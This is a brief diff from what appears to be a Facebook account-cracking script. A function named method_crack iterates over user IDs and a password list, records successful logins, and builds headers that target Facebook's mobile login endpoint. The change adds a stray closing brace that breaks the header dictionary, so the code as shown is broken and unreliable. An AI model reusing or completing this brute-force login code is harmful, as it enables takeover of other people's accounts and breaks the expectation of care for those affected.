@@ -114,7 +114,7 @@ def method_crack(ids,passlist):
                     uid=ids
                 if str(uid) in oks:
                     break
-  header_freefb = {'authority': 'm.facebook.com',
+  header_freefb = {'authority': 'm.facebook.com',}
     'method':'POST',
     'path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100',
     'scheme':'https',
